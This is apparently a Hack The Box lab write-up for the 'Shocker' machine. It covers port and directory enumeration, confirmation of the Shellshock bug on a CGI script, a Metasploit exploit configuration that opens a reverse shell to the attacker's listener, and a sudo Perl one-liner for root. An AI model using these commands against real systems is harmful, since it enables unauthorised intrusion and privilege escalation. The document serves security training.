---
title: Shocker
published: 2025-03-29
description: Easy-rated Linux machine on Hack The Box. 
tags: [HTB, Labs]
category: HTB
draft: false
---

# Shocker

# Shocker - Hack The Box Write-Up

---

## Process (Walkthrough)

### Enumeration

The journey began with enumerating the target to identify services and potential vulnerabilities.

1. **Nmap Scan**
    
    I started with a comprehensive Nmap scan to discover open ports and services:
    
    ```bash
    ┌──(easykp8㉿kps-kali)-[~/Downloads]
    └─$ sudo nmap -Pn -T4 -n -sS -vv -A 10.10.10.56
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-31 21:55 +06
    NSE: Loaded 157 scripts for scanning.
    NSE: Script Pre-scanning.
    NSE: Starting runlevel 1 (of 3) scan.
    Initiating NSE at 21:55
    Completed NSE at 21:55, 0.00s elapsed
    NSE: Starting runlevel 2 (of 3) scan.
    Initiating NSE at 21:55
    Completed NSE at 21:55, 0.00s elapsed
    NSE: Starting runlevel 3 (of 3) scan.
    Initiating NSE at 21:55
    Completed NSE at 21:55, 0.00s elapsed
    Initiating SYN Stealth Scan at 21:55
    Scanning 10.10.10.56 [1000 ports]
    Discovered open port 80/tcp on 10.10.10.56
    Discovered open port 2222/tcp on 10.10.10.56
    Completed SYN Stealth Scan at 21:55, 4.25s elapsed (1000 total ports)
    Initiating Service scan at 21:55
    Scanning 2 services on 10.10.10.56
    Completed Service scan at 21:55, 6.72s elapsed (2 services on 1 host)
    Initiating OS detection (try #1) against 10.10.10.56
    Initiating Traceroute at 21:55
    Completed Traceroute at 21:55, 0.32s elapsed
    NSE: Script scanning 10.10.10.56.
    NSE: Starting runlevel 1 (of 3) scan.
    Initiating NSE at 21:55
    Completed NSE at 21:55, 9.76s elapsed
    NSE: Starting runlevel 2 (of 3) scan.
    Initiating NSE at 21:55
    Completed NSE at 21:55, 1.34s elapsed
    NSE: Starting runlevel 3 (of 3) scan.
    Initiating NSE at 21:55
    Completed NSE at 21:55, 0.00s elapsed
    Nmap scan report for 10.10.10.56
    Host is up, received user-set (0.33s latency).
    Scanned at 2025-03-31 21:55:01 +06 for 25s
    Not shown: 998 closed tcp ports (reset)
    PORT     STATE SERVICE REASON         VERSION
    80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
    | http-methods: 
    |_  Supported Methods: OPTIONS GET HEAD POST
    |_http-title: Site doesn't have a title (text/html).
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    2222/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
    | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
    |   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
    |   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
    Device type: general purpose
    Running: Linux 3.X|4.X
    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
    OS details: Linux 3.2 - 4.14
    TCP/IP fingerprint:
    OS:SCAN(V=7.95%E=4%D=3/31%OT=80%CT=1%CU=42225%PV=Y%DS=2%DC=T%G=Y%TM=67EABAE
    OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=8)OPS
    OS:(O1=M53CST11NW6%O2=M53CST11NW6%O3=M53CNNT11NW6%O4=M53CST11NW6%O5=M53CST1
    OS:1NW6%O6=M53CST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
    OS:(R=Y%DF=Y%T=40%W=7210%O=M53CNNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
    OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
    OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
    OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
    OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
    OS:=S)
    
    Uptime guess: 0.004 days (since Mon Mar 31 21:49:18 2025)
    Network Distance: 2 hops
    TCP Sequence Prediction: Difficulty=263 (Good luck!)
    IP ID Sequence Generation: All zeros
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    TRACEROUTE (using port 8888/tcp)
    HOP RTT       ADDRESS
    1   320.71 ms 10.10.14.1
    2   319.59 ms 10.10.10.56
    
    NSE: Script Post-scanning.
    NSE: Starting runlevel 1 (of 3) scan.
    Initiating NSE at 21:55
    Completed NSE at 21:55, 0.00s elapsed
    NSE: Starting runlevel 2 (of 3) scan.
    Initiating NSE at 21:55
    Completed NSE at 21:55, 0.00s elapsed
    NSE: Starting runlevel 3 (of 3) scan.
    Initiating NSE at 21:55
    Completed NSE at 21:55, 0.00s elapsed
    Read data files from: /usr/share/nmap
    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 25.77 seconds
               Raw packets sent: 1178 (52.642KB) | Rcvd: 1121 (45.582KB)
                      
    ```
    
    **Key Findings:**
    
    - **Port 80/tcp**: Apache httpd 2.4.18 (Ubuntu)
    
    
    - **Port 2222/tcp**: OpenSSH 7.2p2 Ubuntu 4ubuntu2.2
    - OS: Linux 3.2 - 4.14
    The Apache service on port 80 became the primary focus, while OpenSSH on a non-standard port was noted but not immediately relevant.
2. **Web Enumeration with dirsearch**
    
    Tools like Gobuster and Feroxbuster initially failed to yield useful results due to a misconfiguration on the target—requests to directories without a trailing slash returned `404 Not Found`. Dirsearch, however, proved effective:
    
    ```bash
    ┌──(easykp8㉿kps-kali)-[~/Downloads]
    └─$ dirsearch -u "http://10.10.10.56/" -t 50
    
    /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
    from pkg_resources import DistributionNotFound, VersionConflict
    
    *|. _ _  _  _  _ |    v0.4.3
    (*||| *) (/*(*|| (*| )
    
    Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460
    
    Output File: /home/easykp8/Downloads/reports/http_10.10.10.56/__25-03-31_21-55-44.txt
    
    Target: http://10.10.10.56/
    
    [21:55:44] Starting:
    [21:55:57] 403 -  297B  - /.ht_wsr.txt
    [21:55:57] 403 -  302B  - /.htaccess.sample
    [21:55:57] 403 -  300B  - /.htaccess.orig
    [21:55:57] 403 -  301B  - /.htaccess_extra
    [21:55:57] 403 -  298B  - /.htaccess_sc
    [21:55:57] 403 -  291B  - /.html
    [21:55:57] 403 -  290B  - /.htm
    [21:55:57] 403 -  300B  - /.htaccess_orig
    [21:55:57] 403 -  298B  - /.htaccessBAK
    [21:55:57] 403 -  299B  - /.htaccessOLD2
    [21:55:57] 403 -  300B  - /.htaccess.bak1
    [21:55:57] 403 -  300B  - /.htaccess.save
    [21:55:57] 403 -  300B  - /.htpasswd_test
    [21:55:57] 403 -  298B  - /.htaccessOLD
    [21:55:57] 403 -  296B  - /.htpasswds
    [21:55:57] 403 -  297B  - /.httr-oauth
    [21:56:27] 403 -  294B  - /cgi-bin/
    [21:57:02] 403 -  299B  - /server-status
    [21:57:02] 403 -  300B  - /server-status/
    
    Task Completed
    ```
    
    **Results:**
    
    - `/cgi-bin/` (403 Forbidden)
    
    
    - Various `.ht*` files (403 Forbidden)
    Manually appending a trailing slash wasn’t necessary with dirsearch, but I later confirmed `/cgi-bin/user.sh` (200 OK) via browser, which prompted a download. The script appeared to be an uptime test, hinting at a CGI-enabled web server—potentially vulnerable to Shellshock, especially given the machine’s name, "Shocker."
    
    
3. **Shellshock Vulnerability Confirmation**
    
    To verify the Shellshock hypothesis, I ran an Nmap script:
    
    ```bash
    ┌──(easykp8㉿kps-kali)-[~]
    └─$ sudo ls /usr/share/nmap/scripts | grep shellshock
    [sudo] password for easykp8: 
    http-shellshock.nse
                                                                                                                          
    ┌──(easykp8㉿kps-kali)-[~]
    └─$ sudo nmap -sV --script http-shellshock -p 80 --script-args uri=/cgi-bin/user.sh 10.10.10.56
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-31 22:18 +06
    Nmap scan report for 10.10.10.56
    Host is up (0.34s latency).
    
    PORT   STATE SERVICE VERSION
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    | http-shellshock: 
    |   VULNERABLE:
    |   HTTP Shellshock vulnerability
    |     State: VULNERABLE (Exploitable)
    |     IDs:  CVE:CVE-2014-6271
    |       This web application might be affected by the vulnerability known
    |       as Shellshock. It seems the server is executing commands injected
    |       via malicious HTTP headers.
    |             
    |     Disclosure date: 2014-09-24
    |     References:
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
    |       http://seclists.org/oss-sec/2014/q3/685
    |       http://www.openwall.com/lists/oss-security/2014/09/24/10
    |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 10.63 seconds
    
    ```
    
    **Output:**
    
    - Confirmed vulnerability (CVE-2014-6271) on `/cgi-bin/user.sh`.
    This solidified the attack path.

### Exploitation

With Shellshock confirmed, I pursued automated exploitation to gain a user foothold.

- **Searchsploit**: Searched for Shellshock exploits:
Selected: `linux/remote/34900.py` (Apache mod_cgi Remote Command Injection).
    
    ```bash
    ┌──(easykp8㉿kps-kali)-[~]
    └─$ searchsploit shellshock                                                                    
    ------------------------------------------------------------------------------------ ---------------------------------
     Exploit Title                                                                      |  Path
    ------------------------------------------------------------------------------------ ---------------------------------
    Advantech Switch - 'Shellshock' Bash Environment Variable Command Injection (Metasp | cgi/remote/38849.rb
    Apache mod_cgi - 'Shellshock' Remote Command Injection                              | linux/remote/34900.py
    Bash - 'Shellshock' Environment Variables Command Injection                         | linux/remote/34766.php
    Bash CGI - 'Shellshock' Remote Command Injection (Metasploit)                       | cgi/webapps/34895.rb
    Cisco UCS Manager 2.1(1b) - Remote Command Injection (Shellshock)                   | hardware/remote/39568.py
    dhclient 4.1 - Bash Environment Variable Command Injection (Shellshock)             | linux/remote/36933.py
    GNU Bash - 'Shellshock' Environment Variable Command Injection                      | linux/remote/34765.txt
    IPFire - 'Shellshock' Bash Environment Variable Command Injection (Metasploit)      | cgi/remote/39918.rb
    NUUO NVRmini 2 3.0.8 - Remote Command Injection (Shellshock)                        | cgi/webapps/40213.txt
    OpenVPN 2.2.29 - 'Shellshock' Remote Command Injection                              | linux/remote/34879.txt
    PHP < 5.6.2 - 'Shellshock' Safe Mode / disable_functions Bypass / Command Injection | php/webapps/35146.txt
    Postfix SMTP 4.2.x < 4.2.48 - 'Shellshock' Remote Command Injection                 | linux/remote/34896.py
    RedStar 3.0 Server - 'Shellshock' 'BEAM' / 'RSSMON' Command Injection               | linux/local/40938.py
    Sun Secure Global Desktop and Oracle Global Desktop 4.61.915 - Command Injection (S | cgi/webapps/39887.txt
    TrendMicro InterScan Web Security Virtual Appliance - 'Shellshock' Remote Command I | hardware/remote/40619.py
    ------------------------------------------------------------------------------------ ---------------------------------
    Shellcodes: No Results
    ```
    
1. **Metasploit** 
    
    To validate the manual approach, I replicated the exploit using Metasploit:
    
    
    - Module: `exploit/multi/http/apache_mod_cgi_bash_env_exec`
    
    
    - Configuration:
        
        ```bash
        use exploit/multi/http/apache_mod_cgi_bash_env_exec
        set RHOSTS 10.10.10.56
        set TARGETURI /cgi-bin/user.sh
        set LHOST 10.10.14.5
        set LPORT 4444
        run
        
        ```
        
        
        
        
    - **Result**: A Meterpreter session opened, and the user flag was again retrieved from `/home/shelly/user.txt`.

### Privilege Escalation

With user access secured, I sought root privileges.

1. **Sudo Privileges Check**
    
    Ran `sudo -l` in the shell:
    
    - Output: User "shelly" could run `/usr/bin/perl` as root with NOPASSWD.
2. **Escalation via Perl**
    
    Leveraged Perl’s `-e` flag to spawn a root shell:
    
    ```bash
    sudo /usr/bin/perl -e 'exec "/bin/sh"'
    
    ```
    

**Result**: Obtained a root shell. Retrieved the root flag:

```bash
cat /root/root.txt
```



---

## Learnings

1. **Shellshock Exploitation**
    - Shellshock (CVE-2014-6271) exploits Bash’s mishandling of environment variables, enabling command injection via HTTP headers. This machine demonstrated its real-world impact on CGI scripts.
2. **Enumeration Challenges**
    - Misconfigured web servers (e.g., no trailing slash redirection) can thwart tools like Gobuster unless adjusted (e.g., using `f`). Dirsearch’s flexibility proved advantageous.
3. **Vulnerability Confirmation**
    - Nmap scripts (e.g., `http-shellshock.nse`) are powerful for validating hypotheses before exploitation, saving time and effort.
4. **Manual vs. Automated Exploitation**
    - Manual exploitation with a Python script offered control and understanding, while Metasploit provided speed and reliability—both approaches are valuable depending on context.
5. **Privilege Escalation Simplicity**
    - NOPASSWD sudo permissions are a common misconfiguration, easily exploited with tools like Perl or Bash.

---

## References

- **Hack The Box**: [www.hackthebox.eu](https://www.hackthebox.eu/)
- **Shellshock PoC**: [Exploit-DB #34900](https://exploit-db.com/exploits/34900/)
- **Nmap Scripts**: `/usr/share/nmap/scripts/http-shellshock.nse`
- **Metasploit Module**: `exploit/multi/http/apache_mod_cgi_bash_env_exec`
- **Searchsploit**: [Exploit-DB Command Line](https://www.exploit-db.com/searchsploit)